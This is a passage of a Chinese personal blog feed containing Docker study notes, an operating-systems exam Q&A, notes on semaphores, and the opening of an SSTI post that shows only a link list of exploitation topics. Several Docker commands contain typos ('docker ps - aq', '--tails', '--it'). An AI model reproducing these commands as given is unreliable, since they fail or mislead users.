        <content type="html"><![CDATA[<h3 id="可视化工具">可视化工具</h3><p><strong>portainer</strong></p><blockquote><p>Docker 图形化管理工具!提供一个后台面板供我们操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">docker search portainer</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">docker pull portainer/portainer</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v /dockerData/portainer:/data --restart=always --name portainer portainer/portainer</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">启动完成后，访问http://ip:9000</span></span><br></pre></td></tr></table></figure><p>-p: 指定宿主机端口和容器端口 portainer默认端口是9000</p><p>-v: 目录映射，将/var/run/docker.sock映射到容器中，用于访问Docker的守护进程，控制Docker。/dockerData/portainer保存Portainer的配置信息。</p><p>–restart=always: 代表在容器退出时总是重启容器，还有其他几种重启策略：no、on-failure、on-failuer:n、unless-stopped</p><p>第一次会弹出安装界面，配置账号密码、选择是本地Docker还是远程Docker，一般我们选择本地Docker，也就是local，可以查看宿主机配置信息、查看容器、镜像、网络、卷等相关信息。</p></blockquote><h3 id="Docker-镜像加载原理">Docker 镜像加载原理</h3><ul><li><strong>联合文件系统</strong></li></ul><p><img src="https://s1.vika.cn/space/2024/03/28/aa4fd7d08b9c4293bad19b078aae6901" alt=""></p><p><strong>为啥比虚拟机快?</strong></p><blockquote><p>它只需要加载必要的指令和文件.其内核文件与主机共用,即共用 bootfs(boot file system)</p></blockquote><p><img src="https://s1.vika.cn/space/2024/03/28/468f1472efae4190a6775bffdad8d553" alt=""></p><p><strong>一层一层的叠加</strong></p><blockquote><p>特点:</p><p>docker 镜像都是只读的,当容器启动时,一个新的可写层被加载的镜像的顶部!</p><p>这一层就是我们说的容器层,容器之下的都叫镜像层!</p></blockquote><p>镜像层无法改变,我们run起来之后就会加一个容器层,我们可以改变容器层的东西并且重新打包成一个更大的镜像!</p><p>pull -&gt; run-&gt; 打包</p><p><img src="https://s1.vika.cn/space/2024/03/28/a1bf0944493d4b278a0d1ba9e26bb93f" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker1</title>
      <link href="/posts/2b49651d.html"/>
      <url>/posts/2b49651d.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:base_lamp</span><br><span class="line">//拉取php ubantu mysql apache 综合一体化环境 其中 php为5.5.9</span><br></pre></td></tr></table></figure><p>Docker容器与本地系统之间的连接主要通过网络接口实现。Docker容器运行在宿主机的虚拟网络环境中，这个环境与宿主机的网络环境是隔离的，但它们之间可以通过特<br>定的网络接口进行通信。Docker提供了多种网络模式来实现容器与宿主机或其他容器之间的通信，包括桥接模式（bridge）、主机模式（host）、无网络模式（<br>none）和用户定义的网络模式（user-defined networks）。</p><h3 id="桥接模式（Bridge）">桥接模式（Bridge）</h3><p>桥接模式是Docker的默认网络模式。在这种模式下，Docker会创建一个虚拟网桥（通常名为docker0），并将容器连接到这个网桥上。容器通过这个网桥与宿<br>主机和其他容器进行通信。这种模式下，容器可以通过宿主机的IP地址访问到宿主机上的服务，反之亦然。</p><h3 id="主机模式（Host）">主机模式（Host）</h3><p>在主机模式下，容器共享宿主机的网络命名空间，因此容器的网络接口直接连接到宿主机的网络接口。这意味着容器可以直接访问宿主机的网络资源，包括端口和IP地址。</p><h3 id="无网络模式（None）">无网络模式（None）</h3><p>无网络模式下，容器不会连接到任何网络，也就是说，它不能访问外部网络，也不能被外部网络访问。这种模式通常用于安全性要求高的应用。</p><h3 id="用户定义的网络模式（User-defined-networks）">用户定义的网络模式（User-defined networks）</h3><p>用户定义的网络模式允许用户创建自己的网络，并将容器连接到这些网络上。这种模式提供了更多的灵活性和控制，例如，可以设置容器之间的通信规则，或者将容器连接到特定的子<br>网。</p><h3 id="连接方式">连接方式</h3><ul><li><strong>通过IP地址</strong>：在桥接模式下，容器可以通过宿主机的IP地址访问到宿主机上的服务。反之，宿主机也可以通过容器的IP地址访问容器上的服务。</li><li><strong>通过端口映射</strong>：Docker允许将容器的端口映射到宿主机的端口，这样就可以通过宿主机的IP地址和映射的端口访问到容器上的服务。</li><li><strong>通过Docker网络</strong>：在用户定义的网络模式下，容器可以通过容器名称或服务名称（如果使用Docker Compose）访问到同一网络中的其他容器。<br>总结来说，Docker容器与本地系统之间的连接主要通过网络接口实现，具体的连接方式取决于Docker的网络模式配置。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a 列出曾经运行过的容器</span><br><span class="line">docker ps 列出正在运行的容器</span><br><span class="line">docker ps -q 只显示运行容器的编号</span><br></pre></td></tr></table></figure><h3 id="退出容器">退出容器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit  #退出并停止容器</span><br><span class="line">Ctrl + P +Q 退出容器容器不停止</span><br></pre></td></tr></table></figure><h3 id="删除容器">删除容器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rm 容器id(必须处于停止状态)</span><br><span class="line">docker rm -f $(docker ps - aq)   #删除所有容器</span><br><span class="line">docker ps -a -q | xargs docker rm #删除所有容器</span><br></pre></td></tr></table></figure><h3 id="启动和停止容器的操作">启动和停止容器的操作</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器id  # 启动容器</span><br><span class="line">docker restart 容器id # 重启</span><br><span class="line">docker stop 容器id # 停止</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="常用其他命令">常用其他命令</h3><ul><li>后台启动 容器</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -d containerid </span><br><span class="line">docker ps 发现容器停止运行了</span><br><span class="line">docker 使用后台运行就必须有一个前台进程 docker 发现没有应用就会自动停止</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nginx 容器启动后发现自己没有提供服务就会立刻停止服务</span> </span><br></pre></td></tr></table></figure><ul><li><p>查看日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f -t --tails 日志条数 容器id </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-tf 显示日志并且时间戳</span></span><br></pre></td></tr></table></figure></li><li><p>查看容器中进程信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker top 容器id</span><br></pre></td></tr></table></figure></li><li><p>查看镜像元数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect id</span><br></pre></td></tr></table></figure></li><li><p>进入当前正在运行容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">我们通常容器都是使用后台方式运行的,需要进入容器,修改一些配置</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">命令</span> </span><br><span class="line">docker exec -it 容器id /bin/shell (bash/shell)</span><br><span class="line">docker attach 容器id #进入容器正在执行的终端,不会启动新的进程</span><br></pre></td></tr></table></figure></li><li><p>从容器拷贝文件进入主机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a #只要容器在数据就在,与它是否运行无关</span><br><span class="line">docker cp 容器id: 容器内文件路径 目的路径</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>作业:安装一个niginx ,tomcat</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">官方使用</span></span><br><span class="line">docker run --it --rm tomcat:9.0</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用于测试,启动完停止后自动删除数据,用于测试</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">我们常用的命令启动</span></span><br><span class="line">docker run -d -p 3355:8080 --name tomcat01 tomcat </span><br></pre></td></tr></table></figure><ul><li><p>查看内部资源消耗信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stats #如果发现内存不够容器运行,可以在启动时限制其内存</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统问答题汇总(应该,必考~)</title>
      <link href="/posts/4b7af5ea.html"/>
      <url>/posts/4b7af5ea.html</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="设备驱动进程执行的主要功能是什么">设备驱动进程执行的主要功能是什么</h3></blockquote><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">--</span> <span class="number">1</span>）接收由设备独立性软件发来的命令和参数，并将命令中的抽象要求转换为具体要求。</span><br><span class="line"></span><br><span class="line">例如，将磁盘块号转换为磁盘的盘面、磁道号及扇区号。</span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> <span class="number">2</span>）检查用户<span class="built_in">I</span><span class="operator">/</span><span class="built_in">O</span>请求的合法性，了解<span class="built_in">I</span><span class="operator">/</span><span class="built_in">O</span>设备的状态，传递有关参数，设置设备的工作方式。</span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> <span class="number">3</span>）发出<span class="built_in">I</span><span class="operator">/</span><span class="built_in">O</span>命令。</span><br><span class="line"></span><br><span class="line">如果设备空闲，便立即启动<span class="built_in">I</span><span class="operator">/</span><span class="built_in">O</span>设备去完成指定的<span class="built_in">I</span><span class="operator">/</span><span class="built_in">O</span>操作；如果设备处于忙碌状态，则将请求者的请求块挂在设备队列上等待。</span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> <span class="number">4</span>）及时响应由控制器或通道发来的中断请求，并根据其中断类型调用相应的中断处理程序进行处理。</span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> <span class="number">5</span>）对于设置有通道的计算机系统，驱动程序还应能够根据用户的<span class="built_in">I</span><span class="operator">/</span><span class="built_in">O</span>请求，自动地构成通道程序。</span><br></pre></td></tr></table></figure><blockquote><h3 id="中断和轮询的区别？">中断和轮询的区别？</h3></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">中断和轮询都是处理设备输入/输出（I/O）的方式，但它们有很大的区别。</span><br><span class="line"></span><br><span class="line">中断是一种硬件触发的事件通知机制，当I/O设备需要<span class="meta">CPU</span>处理时，会发送一个中断信号给<span class="meta">CPU</span>，<span class="meta">CPU</span>暂停当前任务，转而处理中断请求，处理完毕后再回到原任务。中断可以提高<span class="meta">CPU</span>利用率，因为只有在需要处理设备请求时才会占用<span class="meta">CPU</span>资源，而不是一直轮询。</span><br><span class="line"></span><br><span class="line">轮询是一种软件轮询机制，它是<span class="meta">CPU</span>不断地查询I/O设备的状态是否发生变化，如果变化了就进行相应的处理。这种方式会一直占用<span class="meta">CPU</span>资源，且浪费时间，因为轮询需要<span class="meta">CPU</span>在不断地查询设备状态，即使设备没有任何变化。</span><br><span class="line"></span><br><span class="line">因此，中断比轮询更加高效和节省<span class="meta">CPU</span>资源。</span><br></pre></td></tr></table></figure><blockquote><h3 id="进程间同步和互斥的含义是什么">进程间同步和互斥的含义是什么</h3></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.进程同步也是进程之间直接的制约关系，是为完成某种任务而建立的两个或多个线程，这个线程需要在某些位置上协调他们的工作次序而等待、传递信息所产生的制约关系。进程间的直接制约关系来源于他们之间的合作。</span><br><span class="line">2.进程互斥是进程之间的间接制约关系。当一个进程进入临界区使用临界资源时，另一个进程必须等待。只有当使用临界资源的进程退出临界区后，这个进程才会解除阻塞状态。</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><h3 id="程序、进程的区别和联系">程序、进程的区别和联系</h3></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">进程与程序的区别</span><br><span class="line"><span class="selector-tag">a</span>.程序是静态的实体，进程是动态的实体。</span><br><span class="line"><span class="selector-tag">b</span>.程序是存储在某种介质上的二进制代码，进程对应了程序的执行过程，系统不需要为一个不执行的程序创建进程，一旦进程被创建，就处于不断变化的动态过程中，对应了一个不断变化的上下文环境。</span><br><span class="line">c.程序是永久的，进程是暂时存在的。程序的永久性是相对于进程而言的，只要不去删除它，它可以永久的存储在介质当中。</span><br><span class="line">d.进程有独立性并发执行，程序不能并发执行，且无一一对应关系</span><br><span class="line">e.进程之间异步运行相互制约</span><br><span class="line"></span><br><span class="line">进程与程序的联系:</span><br><span class="line">进程不能脱离具体程序而虚设，程序规定了进程所要完成的动作</span><br><span class="line">进程是程序的一次执行，而进程总是对应至少一个特定的程序。一个程序可以对应多个进程，也就是进程和程序并不是一 一对应的。同一个程序可以在不同的数据集合上运行，因而构成若干个不同的进程。几个进程能并发地执行相同的程序代码，而同一个进程能顺序地执行几个程序。</span><br></pre></td></tr></table></figure><blockquote><h3 id="分页和分段存储管理有何区别">分页和分段存储管理有何区别</h3></blockquote><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">(1)</span> 页是信息的物理单位，分页是为实现离散分配方式，以消减内存的外零头，提高内存的利用率。段则是信息的逻辑单位，它含有一组其意义相对完整的信息。分段的目的是为了能更好地满足用户的需要。</span><br><span class="line"></span><br><span class="line"><span class="comment">(2)</span> 分段每次交换的是一段有意义的信息，而不是像分页那样每次只交换固定大小的页</span><br><span class="line"></span><br><span class="line"><span class="comment">(3)</span> 分页的地址空间是一维的，而分段的作业地址空间是二维的</span><br><span class="line"><span class="number">4.</span>分段管理中，段长可以根据需求动态增长</span><br><span class="line"><span class="number">5.</span>段式管理有利于对具有完整逻辑功能的信息段进行共享</span><br><span class="line"><span class="number">6.</span>段式管理便于进行动态链接，而页式管理进行动态链接的过程非常复杂</span><br></pre></td></tr></table></figure><blockquote><h3 id="非剥夺方式和抢占方式的含义">非剥夺方式和抢占方式的含义</h3></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">剥夺方式也称为抢占方式，其含义是当一个进程正在执行它的一个<span class="meta">CPU</span>周期期间，系统可基于某种原则强行分割该进程的当前<span class="meta">CPU</span>时值，即强行剥夺现行进程正占用的<span class="meta">CPU</span>，并把<span class="meta">CPU</span>分配给其它进程。 </span><br><span class="line">非剥夺方式也称非抢占方式，采用这种调度方式时，一旦把处理机分配给某个进程后，便让该进程一直执行，直到该进程执行完成或等待某事件而被阻塞时，才把<span class="meta">CPU</span>分配给其他进程，决不允许其他进程抢占已分配出去的<span class="meta">CPU</span>。</span><br></pre></td></tr></table></figure><blockquote><p>局部性原理</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.时间局部性 ：如果程序中的某条指令一旦执行，不久以后该指令可能再次执行；如果某数据被访问过，不久以后该数据可能再次被访问。产生时间局部性的典型原因，是由于在程序中存在着大量的循环操作。</span><br><span class="line">2.空间局部性 ：一旦程序访问了某个存储单元，在不久之后，其附近的存储单元也将被访问，即程序在一段时间内所访问的地址，可能集中在一定的范围之内，这是因为指令通常是顺序存放、顺序执行的，数据也一般是以向量、数组、表等形式簇聚存储的。</span><br></pre></td></tr></table></figure><blockquote><h3 id="什么是索引文件？为什么要引入多级索引？"><strong>什么是索引文件？为什么要引入多级索引？</strong></h3></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">①索引文件是指当记录为可变长度时，通常为之建立一张索引表，并为每个记录设置一个表项构成的文件。通常将索引非顺序文件简称为索引文件。</span><br><span class="line">②索引是为了用户的访问速度更快，多级索引结构可以有效的管理索引文件，可根据用户的访问情况多级处理。</span><br><span class="line">3.当文件太大，其索引块太多，一级索引的方式是低效的，此时，应为这些索引再建立一级索引，称为第一级索引，即系统再分配一个索引块，作为第一级索引块同理便可引出多级索引来存储大文件！</span><br></pre></td></tr></table></figure><blockquote><h3 id="请列出单处理器调度的常用五种算法，并说明每种算法是否为可抢占算法">请列出单处理器调度的常用五种算法，并说明每种算法是否为可抢占算法</h3></blockquote><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">调度算法</span><br><span class="line"><span class="variable">FCFS</span> 先到先服务</span><br><span class="line">概念：先到达等待队列的进程或作业优先被服务，属于非抢占式算法。</span><br><span class="line"></span><br><span class="line">特点：对长作业有利，对短作业不利（排在长作业后面的短作业需要等待很久，带权周转时间很大），这种问题称为「护航效应」（即耗时较少的潜在资源消费者被排在重量级的资源消费者之后）。但不会导致饥饿，因为新来的进程一定排在等待的进程后面执行。</span><br><span class="line"></span><br><span class="line"><span class="variable">SJF</span> 最短任务优先</span><br><span class="line">概念：在等待队列中需要时间最短的进程优先被服务，也属于非抢占式算法。</span><br><span class="line"></span><br><span class="line">特点：如果<span class="variable">A</span>、<span class="variable">B</span>、<span class="built_in">C</span>都在等待队列中，那么<span class="variable">SJF</span>确实可以使得三个进程的平均周转时间最短，属于最优调度算法；但如果短任务<span class="variable">B</span>、<span class="built_in">C</span>在长任务<span class="variable">A</span>稍晚一刻到达，由于算法是非抢占式的，<span class="variable">B</span>、<span class="built_in">C</span>仍然需要等待<span class="variable">A</span>运行完，导致护航效应。</span><br><span class="line"></span><br><span class="line"><span class="variable">STCF</span> 最短完成时间优先</span><br><span class="line">概念：即抢占式<span class="variable">SJF</span>。每当有进程加入导致就绪队列改变时，就需要调度，如果新到达的进程，剩余时间比当前运行的进程剩余时间更短，则由新进程抢占处理机，当前运行进程重新回到就绪队列。</span><br><span class="line"></span><br><span class="line">特点：抢占式<span class="variable">SJF</span>可以使得所有进程在整体上具有最短的平均周转时间，但会导致长进程具有较高的响应时间，如果有源源不断的短作业到来，可能会使长作业长时间内得不到服务，产生饥饿现象。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">响应比 <span class="operator">=</span> （等待时间 <span class="operator">+</span> 要求服务时间）<span class="operator">/</span> 要求服务时间</span><br><span class="line"></span><br><span class="line">特点：根据响应比计算公式可知，在等待时间相同时，要求服务时间短的作业优先被调度；在要求服务时间相同时，等待时间长的作业优先被调度。对于长作业来说，等待时间越久，响应比越大，更容易优先被服务，从而避免了长作业饥饿。但响应比的计算增加了系统开销。</span><br><span class="line"></span><br><span class="line"><span class="variable">RR</span> 轮转调度</span><br><span class="line">概念：按照各进程到达就绪队列的顺序，轮流地让各个进程执行一个时间片（<span class="variable">time</span> <span class="variable">slice</span>）， 让每个进程在一定时间间隔内都可以得到响应，反复执行直到所有任务完成，属于抢占式算法。其中时间片长度必须是时钟中断周期的整数倍，因为时间片到期的通知是由时钟中断指令发出的。</span><br><span class="line"></span><br><span class="line">特点：应权衡时间片长度的选取，时间片越短，响应时间越好，但上下文切换过于频繁也会影响整体性能；而时间片太长，就会退化为<span class="variable">FCFS</span>，而且进程响应时间会增加。如果关心响应时间，带有合理时间片长度的<span class="variable">RR</span>算法就是非常好的调度算法；但如果关心周转时间，<span class="variable">RR</span>几乎是最差的，甚至可能比<span class="variable">FCFS</span>都差。</span><br><span class="line"></span><br><span class="line">重视公平性，响应时间会比较短，但周转时间比较长；允许非公平，周转时间就比较短，但也要以响应时间为代价。实际上这两者的权衡是很常见的。</span><br><span class="line"></span><br><span class="line">小结</span><br><span class="line"><span class="variable">FCFS</span>是最简单的调度算法，<span class="variable">SJF</span>和<span class="variable">STCF</span>优化了周转时间，但对响应时间不利；<span class="variable">RR</span>优化了响应时间，但对周转时间不利。</span><br><span class="line"></span><br><span class="line">但以上算法都采用了两个假设：作业没有<span class="built_in">I</span><span class="operator">/</span><span class="built_in">O</span>、每个作业的运行时间是已知的。这些假设也限制了它们的使用。</span><br><span class="line"></span><br><span class="line"><span class="variable">MLFQ</span> 多级反馈队列调度算法</span><br><span class="line">概念：<span class="variable">MLFQ</span>有多个独立的队列，每个队列都有不同的优先级，任何时刻，一个工作只能存在于一个队列中。<span class="variable">MLFQ</span>总是优先执行较高优先级的工作。同一队列中的任务具体相同的优先级，此时对这些工作采用<span class="variable">RR</span>算法。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">FCFS</span> 非</span><br><span class="line">时间片 抢</span><br><span class="line">最短进程优先<span class="variable">SPN</span> 非</span><br><span class="line">最短剩余时间优先 抢</span><br><span class="line">最高响应比优先 非</span><br><span class="line">反馈 抢</span><br></pre></td></tr></table></figure><blockquote><h3 id="作业题汇总-一些解答"><strong>作业题汇总&amp;&amp;一些解答</strong></h3></blockquote><table><thead><tr><th style="text-align:center">作业</th><th style="text-align:left">答案</th></tr></thead><tbody><tr><td style="text-align:center">第二次： 进程的基本状态及其转换，进程映像，PCB索引结构示意 （以上三个画图及其描述） 线程的实现原理（画图➕说明）</td><td style="text-align:left"><img src="https://s1.vika.cn/space/2024/06/02/d4234e4a1dfa4331a766690510fee7e4" alt=""></td></tr><tr><td style="text-align:center">操作系统作业（第三次）： 1.互斥P,V操作伪代码； 2.生产者消费者模型P,V操作伪代码； 3.画出有环不产生互斥的场景资源图。分析互斥产生的原因，资源的分配和管理方式。得出结论：为什么采用鸵鸟算法？</td><td style="text-align:left"></td></tr><tr><td style="text-align:center">1、画出多级反馈队列法的图并进行解释 2、解释中断机制中中断向量表的作用 3、自己给出一个动态分区法里面的调度，对照课件中的图，探讨碎片问题(不能跟书上一模一样)，推导过程并总结其缺点 4、将动态分区法和分页技术做一个对比，指出各自的优缺点</td><td style="text-align:left"></td></tr><tr><td style="text-align:center">1.解释分页机制在一级页表情况下的时间复杂度和空间复杂度到底由哪些因素决定； 2.解释书本P128页图4-18利用快表实现地址转换流程图，逻辑地址怎么转化为物理地址，并分析转化过程中的时间复杂度，可以假设每个快表的命中率为90%； 3.解释书本P138页图4-31段页式系统的地址转换流程图。</td><td style="text-align:left"><img src="https://s1.vika.cn/space/2024/06/03/8cc00e9e6cc64373bee4c0407a6d53a2" alt=""></td></tr><tr><td style="text-align:center">用最近最久未使用置换法，按照课本上第147页图4-39的数据，将例题换成四个内存块，画出新的最近最久未使用算法页置换序列（上面画缺页，下面画堆栈变化）</td><td style="text-align:left"></td></tr><tr><td style="text-align:center">借助中断向量表描述设备的中断状态调控机制，对比与轮询的最主要区别。</td><td style="text-align:left"></td></tr><tr><td style="text-align:center">借助中断向量表画图描述(从软中断开始)在32位操作系统下怎么实现系统调用，并描述中断向量表、软中断在其中起到的作用。</td><td style="text-align:left"></td></tr><tr><td style="text-align:center"></td><td style="text-align:left"></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 期末复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同步互斥问题</title>
      <link href="/posts/f860b93c.html"/>
      <url>/posts/f860b93c.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>进程互斥的原则:</p></blockquote><p><img src="https://s1.vika.cn/space/2024/06/01/70959650c256471aa1e315c0ea0aae0a" alt=""></p><blockquote><p>信号量机制—整形信号量(P,V操作)</p></blockquote><p><img src="https://s1.vika.cn/space/2024/05/31/61117246e676497c9e4750bba31b7ffa" alt=""></p><p><code>容易出现忙等,进程一直卡住</code></p><blockquote><p>信号量机制—记录型信号量(P,V操作)</p></blockquote><p><code>解决忙等问题</code></p><p>当缺少资源时,进程会自动放弃cpu,并将其转到阻塞队列的队头,当有进程释放资源时,利用wakeup(v操作)唤醒队头进程,立即将资源分配给队头进程</p><p><em>流程_</em></p><p><img src="https://s1.vika.cn/space/2024/05/31/b7cad37a29c64d0d93a714d716676637" alt=""></p><blockquote><p>生产者消费者模型</p></blockquote><p><img src="https://s1.vika.cn/space/2024/06/01/a085ebb58adc4f91bda8cb3f8fcbf386" alt=""></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">两个同步信号量</span><br><span class="line">生产者对空闲缓冲区进行操作</span><br><span class="line">消费者对产品数量进行操作</span><br></pre></td></tr></table></figure><p><code>思考:交换P V操作的顺序会出现什么问题</code></p><p><img src="https://s1.vika.cn/space/2024/06/01/11fdfdd1aa2441c1b6e0a65173e4c641" alt=""></p><p><code>因此,实现互斥的P操作一定要在实现同步的P操作之后</code></p><p><code>V操作的顺序可以互换</code></p>]]></content>
      
      
      <categories>
          
          <category> 操作系统复习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSTI</title>
      <link href="/posts/47d18eddca.html"/>
      <url>/posts/47d18eddca.html</url>
      
        <content type="html"><![CDATA[<p>参看所有收录EXP:</p><p><code>[SSTI (Server Side Template Injection) | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#python)</code></p><h1><a href="https://www.raingray.com/archives/4183.html">SSTI (Server Side Template Injection)</a></h1><h2 id="目录">目录</h2><ul><li><a href="https://www.raingray.com/archives/4183.html#%E7%9B%AE%E5%BD%95">目录</a></li><li><a href="https://www.raingray.com/archives/4183.html#%E7%AE%80%E4%BB%8B">简介</a></li><li>利用<ul><li>Python Jinja2<ul><li><a href="https://www.raingray.com/archives/4183.html#subprocess.Popen+%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">subprocess.Popen 执行命令</a></li><li><a href="https://www.raingray.com/archives/4183.html#%E8%AF%BB%E5%8F%96+Flask+%E9%85%8D%E7%BD%AE">读取 Flask 配置</a></li><li><a href="https://www.raingray.com/archives/4183.html#self+%E5%AF%B9%E8%B1%A1%E8%8E%B7%E5%8F%96">self 对象获取</a></li><li><a href="https://www.raingray.com/archives/4183.html#%E5%85%B6%E4%BB%96+Payload">其他 Payload</a></li></ul></li><li><a href="https://www.raingray.com/archives/4183.html#PHP+Twig+(1.9.0)">PHP Twig (1.9.0)</a></li><li><a href="https://www.raingray.com/archives/4183.html#Node.js+Pug">Node.js Pug</a></li></ul></li><li>靶场练习<ul><li><a href="https://www.raingray.com/archives/4183.html#BUUCTF">BUUCTF</a></li><li><a 